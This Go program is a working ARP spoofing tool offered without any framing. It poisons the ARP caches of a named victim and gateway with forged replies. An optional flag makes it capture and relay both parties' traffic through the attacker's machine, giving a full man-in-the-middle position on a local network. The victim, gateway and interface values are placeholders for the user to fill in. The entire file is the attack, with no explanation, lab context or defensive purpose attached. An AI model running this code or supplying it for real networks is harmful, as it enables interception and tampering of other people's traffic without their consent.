package main

import (
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	VICTIM_MAC                     = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	GATEWAY_MAC                    = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	ATTACKERS_MAC                  = net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	VICTIM_IP                      = []byte{00, 000, 000, 000}
	GATEWAY_IP                     = []byte{000, 000, 000, 000}
	FORWARD                        = flag.Bool("FORWARD", false, "Use This Flag In Order to Use Scripts Forwarder")
	SPOOF_TIME_STEP  time.Duration = 50
	SPOOF_ITERATIONS               = 10000
	INTERFACE_NAME   string        = "<your ifnet name>"
	sendMu           sync.Mutex
	wg               sync.WaitGroup
)

func main() {
	flag.Parse()

	handler, err := pcap.OpenLive(INTERFACE_NAME, 4096, false, time.Second*10)
	if err != nil {
		log.Fatal("Serry Failed to Create Handler:", err)
	}

	eth := &layers.Ethernet{
		SrcMAC:       ATTACKERS_MAC,
		DstMAC:       VICTIM_MAC,
		EthernetType: layers.EthernetTypeARP,
		// Length:       "",
	}

	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(ATTACKERS_MAC),
		SourceProtAddress: GATEWAY_IP,
		DstHwAddress:      []byte(VICTIM_MAC),
		DstProtAddress:    VICTIM_IP,
	}

	ethToGateway := &layers.Ethernet{
		SrcMAC:       ATTACKERS_MAC,
		DstMAC:       GATEWAY_MAC,
		EthernetType: layers.EthernetTypeARP,
	}

	arpToGateway := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(ATTACKERS_MAC),
		SourceProtAddress: VICTIM_IP,
		DstHwAddress:      []byte(GATEWAY_MAC),
		DstProtAddress:    GATEWAY_IP,
	}

	buff := gopacket.NewSerializeBuffer()
	arpOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err = gopacket.SerializeLayers(buff, arpOpts, eth, arp)
	if err != nil {
		log.Fatal("Failed to write to buffer:", err)
	}

	gwbuff := gopacket.NewSerializeBuffer()
	gwarpOpts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	err = gopacket.SerializeLayers(gwbuff, gwarpOpts, ethToGateway, arpToGateway)
	if err != nil {
		log.Fatal("Failed to write to buffer:", err)
	}

	wg.Add(1)
	go func() {
		defer wg.Done()
		for i := 0; i < SPOOF_ITERATIONS; i++ {
			sendMu.Lock()
			err = handler.WritePacketData(buff.Bytes())
			sendMu.Unlock()
			if err != nil {
				log.Fatal("Failed to Send Packet:", err)
				os.Exit(1)
			}
			time.Sleep(time.Millisecond * SPOOF_TIME_STEP)
		}
	}()

	wg.Add(1)
	go func() {
		defer wg.Done()
		for i := 0; i < SPOOF_ITERATIONS; i++ {
			sendMu.Lock()
			err = handler.WritePacketData(gwbuff.Bytes())
			sendMu.Unlock()
			if err != nil {
				log.Fatal("Failed to Send Packet:", err)
				os.Exit(1)
			}
			time.Sleep(time.Millisecond * SPOOF_TIME_STEP)
		}
	}()

	log.Println("ARP Poisoning Started !!!")

	if *FORWARD {
		log.Println("Scripts Forwarder is used")

		captureHandle, err := pcap.OpenLive(INTERFACE_NAME, 4096, true, pcap.BlockForever)
		if err != nil {
			log.Fatal("Sorry Failed to Create Handler:", err)
		}

		filter := fmt.Sprintf(
			"ether src %s or ether src %s",
			VICTIM_MAC.String(),
			GATEWAY_MAC.String())

		captureHandle.SetBPFFilter(filter)
		if err != nil {
			log.Fatal("Failed to set BPF filter:", err)
		}

		wg.Add(1)
		go func() {
			defer wg.Done()
			packetSource := gopacket.NewPacketSource(captureHandle, captureHandle.LinkType())
			for packet := range packetSource.Packets() {
				ethLayer := packet.Layer(layers.LayerTypeEthernet)
				if ethLayer == nil {
					continue
				}
				eth := ethLayer.(*layers.Ethernet)

				if eth.EthernetType == layers.EthernetTypeARP {
					continue
				}

				var newDstMAC net.HardwareAddr
				switch eth.SrcMAC.String() {
				case VICTIM_MAC.String():
					newDstMAC = GATEWAY_MAC
				case GATEWAY_MAC.String():
					newDstMAC = VICTIM_MAC
				default:
					continue
				}

				newEth := &layers.Ethernet{
					SrcMAC:       ATTACKERS_MAC,
					DstMAC:       newDstMAC,
					EthernetType: eth.EthernetType,
				}

				rawPayload := gopacket.Payload(eth.Payload)

				buf := gopacket.NewSerializeBuffer()
				opts := gopacket.SerializeOptions{
					FixLengths:       true,
					ComputeChecksums: true,
				}

				if err := gopacket.SerializeLayers(buf, opts, newEth, rawPayload); err != nil {
					log.Println("Serialize error:", err)
					continue
				}

				sendMu.Lock()
				err := handler.WritePacketData(buf.Bytes())
				sendMu.Unlock()

				if err != nil {
					log.Println("Forward error:", err)
				} else {
					fmt.Printf("Forwarded: %s → %s\n", eth.SrcMAC, newDstMAC)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Println("finished")
}
